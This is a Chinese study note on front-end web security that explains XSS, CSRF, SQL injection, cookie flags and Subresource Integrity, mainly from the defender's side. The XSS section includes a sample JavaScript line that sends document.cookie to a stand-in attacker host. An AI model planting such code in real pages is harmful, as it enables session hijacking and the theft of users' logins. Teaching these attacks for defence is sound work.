# 前端安全性

腾讯大牛亲授漏洞防御(3-7 看完)

## xss 处理(Cross Site Scripting) 跨站脚本攻击

### scripting 能干吗？

1. 获取页面数据
2. 获取 cookies
3. 劫持前端逻辑
4. 发送请求
5. 偷取网站任意数据
6. 偷取用户资料
7. 偷取用户密码和登录态
8. 欺骗用户

### xss 攻击分类

1. 反射型(url 参数直接注入)
2. 存储型(存储到 DB 后读取时注入)

### xss 攻击注入点

浏览器只能拦截前两种(只适合反射性 css)

1. HTML 节点内容
2. HTML 属性
3. Javascript 代码
4. 富文本

本质是 HTML 注入,用户输入的数据被当成 Html 代码执行了
对<>单引号和双引号进行转义;对空格进行转义

1. cookie 使用 HttpOnly 限制: 是的客户端的 js 代码不能读取到 cookie 值,但是不能防止从 HTTP header 里得到 cookie
2. 输出文本 HTML 转义:对网页上显示的文本内容使用 HtmlEncode 转义。js 函数：OWASP ESAPI 中的 encodeCharacter。其它的如 xmlencode、jsonencode 等转义函数。
3. 检查输入的 URL
4. 对传入 js 函数的文本类型参数值进行 javascript 转义

会话劫持和 XSS：
常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS (en-US) 攻击。

```js
// HttpOnly 类型的 Cookie 用于阻止了JavaScript 对其的访问性而能在一定程度上缓解此类攻击。
new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

## SQL 注入

预防办法：数据与代码分离,即不用字符串拼凑 SQL 语句

## XST 处理

XST(跨站追踪)攻击，关闭 Web 服务器的 TRACE 方法

## CSRF 攻击的防御

- 令牌同步模式(tokie)
  原理:令牌可以通过任何方式生成，只要确保随机性和唯一性.这样确保攻击者发送请求时候，由于没有该令牌而无法通过验证。
- 检查 Referer 字段
  因其完全依赖浏览器发送正确的 Referer 字段。虽然 http 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。
- 添加校验 token
  由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址;正常的访问时，客户端浏览器能够正确得到并传回这个伪随机数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪随机数的值，服务端就会因为校验 token 的值为空或者错误，拒绝这个可疑请求。

## HTTP 头注入

## Cookie 安全

标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端
HttpOnly 属性可防止通过 javascript 访问 cookie 值
SameSite 属性 允许服务器要求某个 cookie 在跨站请求时不会被发送,从而可以阻止跨站请求伪造攻击(CSRF)
Cookie 的SameSite属性用来限制第三方 Cookie，从而减少安全风险
1. SameSite=None:浏览器会在同站请求、跨站请求下继续发送 cookies,不区分大小写 
2. SameSite=Strict:浏览器将只在访问相同站点时发送 cookie。（在原有 Cookies 的限制条件上的加强，如上文 “Cookie 的作用域” 所述）; 这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。
3. SameSite=Lax:但只有当用户从外部站点导航到 URL 时才会发送。如 link 链接

```JS
Set-Cookie: key=value; SameSite=Strict;
Set-Cookie: sessionId=e8bb43229de9; Domain=foo.example.com
```

## 提高资源的安全性-SRI(Subresource Integrity) 与 CSP

```js
<script
  type="text/javascript"
  src="app.bundle.js"
  integrity="sha256-WcONURDxHuPpCyTfyxv6ULC5IQS8W/TvkOfiluU2Y1w= sha512-XZBIDDYvednMCvIE+VxLhoh3GZ550KQEUuUG8EA/HNUKVOa9sl2YpyeIGVmi6NVu2VAAT+bReuzUszzugYNxKQ=="
  crossorigin="anonymous"
></script>;
crossorigin: "" | anonymous | (use-credentials) 请求头都会带上Origin 属性
// 使用use-credentials,这个就同时会在跨域请求中带上 cookie 和其他的一些认证信息. 需要服务端response Header 返回：Access-Control-Allow-Credentials
```

- SRI
  SRI 是用来校验资源是否完整的安全方案。通过为页面引用的资源指定信息摘要，当资源被劫持篡改内容时，浏览器校验信息摘要不匹配，将会拒绝代码执行并抛出加载异常，保证加载资源的完整性。
  启用 SRI:使用 SRI 只需要给页面标签添加 integrity 属性，属性值为签名算法（sha256、sha384、sha512）和摘要签名内容组成，中间用 - 分隔。
  可以通过 webpack webpack-subresource-integrity 插件实现 integrity 实现添加过程。
  开启 SRI，浏览器会对相关资源进行 CORS 检查。至此，当资源内容被劫持篡改时，浏览器校验签名不匹配将使得异常资源不被执行，并触发加载失败。从而进入到资源加载失败的监控流程中，最终可以通过切换 CDN 域名或主域名进行加载重试，直到加载上正确资源，避免资源被劫持篡改内容后注入广告或白屏等情况。
  HTTPS 可以有效应对流量劫持的问题，SRI 在资源完整性再上一道屏障，CSP 也进行了其他方面的补充。“三驾马车” 为页面资源安全 “保驾护航”。
  
